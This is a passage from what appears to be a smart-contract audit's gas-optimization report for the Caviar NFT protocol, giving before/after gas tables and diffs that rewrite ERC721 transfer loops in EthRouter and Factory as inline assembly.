calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>217300</td>\n<td>402940</td>\n<td>232102</td>\n<td>7</td>\n</tr>\n<tr>\n<td>After</td>\n<td>217290</td>\n<td>402928</td>\n<td>232091</td>\n<td>7</td>\n</tr>\n</tbody>\n</table>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L228-L230\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L228-L230</a></p>\n<p><em>Gas Savings for <code>EthRouter.deposit</code>, obtained via protocol’s tests: Avg 12 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2371</td>\n<td>114072</td>\n<td>29900</td>\n<td>4</td>\n</tr>\n<tr>\n<td>After</td>\n<td>2359</td>\n<td>114060</td>\n<td>29888</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L256-L258\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L256-L258</a></p>\n<p><em>Gas Savings for <code>EthRouter.change</code>, obtained via protocol’s tests: Avg 12 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>284857</td>\n<td>298879</td>\n<td>217295</td>\n<td>4</td>\n</tr>\n<tr>\n<td>After</td>\n<td>284845</td>\n<td>298867</td>\n<td>217283</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"g-08-use-assembly-for-loops\" style=\"position:relative;\"><a href=\"#g-08-use-assembly-for-loops\" aria-label=\"g 08 use assembly for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Use assembly for loops</h2>\n<p>In the following instances, assembly is used for more gas efficient loops. The only memory slots that are manually used in the loops are <code>scratch space (0x00-0x20)</code>, the <code>free memory pointer (0x40)</code>, and the <code>zero slot (0x60)</code>. This allows us to avoid using the free memory pointer to allocate new memory, which may result in memory expansion costs.</p>\n<p><strong>Note that in order to do this optimization safely we will need to cache and restore the <code>free memory pointer</code> after the loop. We will also set the <code>zero slot (0x60)</code> back to 0.</strong></p>\n<p><em>The <a href=\"https://gist.github.com/0xJCN/b03b5f1f8cabc937c8bbe4d4a46b8d47\">final diffs</a> have comments explaining the assembly code</em>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L119-L121\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L119-L121</a></p>\n<p><em>Gas Savings for <code>Factory.create</code>, obtained via protocol’s tests: Avg 129 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>161124</td>\n<td>245619</td>\n<td>148801</td>\n<td>35</td>\n</tr>\n<tr>\n<td>After</td>\n<td>161112</td>\n<td>243941</td>\n<td>148672</td>\n<td>35</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/Factory.sol b/src/Factory.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 09cbb4e..c2e06f6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/Factory.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/Factory.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -116,8 +116,26 @@ contract Factory is ERC721, Owned {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // deposit the nfts from the caller into the pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(_nft).safeTransferFrom(msg.sender, address(privatePool), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if mload(tokenIds) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(add(tokenIds, 0x20), mul(0x20, mload(tokenIds)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := add(tokenIds, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x20, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, privatePool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, mload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let success := call(gas(), calldataload(0x24), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L134-L137\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L134-L137</a></p>\n<p><em>Gas Savings for <code>EthRouter.buy</code>, obtained via protocol’s tests: Avg 5728 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>187054</td>\n<td>397581</td>\n<td>199750</td>\n<td>7</td>\n</tr>\n<tr>\n<td>After</td>\n<td>182465</td>\n<td>384540</td>\n<td>194022</td>\n<td>7</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">buys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:            }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..4ea89f5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -131,9 +131,28 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; buys[i].tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                // transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(buys[i].nft).safeTransferFrom(address(this), msg.sender, buys[i].tokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Buy calldata _buy = buys[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] calldata _tokenIds = _buy.tokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                if _tokenIds.length {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let end := add(_tokenIds.offset, mul(0x20, _tokenIds.length))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let j := _tokenIds.offset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x20, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x40, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x60, calldataload(j))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        let success := call(gas(), calldataload(add(_buy, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        j := add(j, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if iszero(lt(j, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L161-L163\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L161-L163</a></p>\n<p><em>Gas Savings for <code>EthRouter.sell</code>, obtained via protocol’s tests: Avg 4735 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>217300</td>\n<td>402940</td>\n<td>232102</td>\n<td>7</td>\n</tr>\n<tr>\n<td>After</td>\n<td>212706</td>\n<td>395062</td>\n<td>227367</td>\n<td>7</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:            }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..c1a07ab 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -158,8 +158,30 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // loop through and execute the sells</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; sells.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the NFTs into the router from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; sells[i].tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(sells[i].nft).safeTransferFrom(msg.sender, address(this), sells[i].tokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                Sell calldata _sell = sells[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint256[] calldata _tokenIds = _sell.tokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if _tokenIds.length {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        let end := add(_tokenIds.offset, mul(0x20, _tokenIds.length))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        let j := _tokenIds.offset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x20, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x40, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            mstore(0x60, calldataload(j))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            let success := call(gas(), calldataload(add(_sell, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                                revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            j := add(j, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            if iszero(lt(j, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L239-L241\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L239-L241</a></p>\n<p><em>Gas Savings for <code>EthRouter.deposit</code>, obtained via protocol’s tests: Avg 211 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2371</td>\n<td>114072</td>\n<td>29900</td>\n<td>4</td>\n</tr>\n<tr>\n<td>After</td>\n<td>2371</td>\n<td>113228</td>\n<td>29689</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..3006dcb 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -236,8 +236,26 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer NFTs from caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if tokenIds.length {</span></span></span>\n<span class=\"grvsc-line\"><span 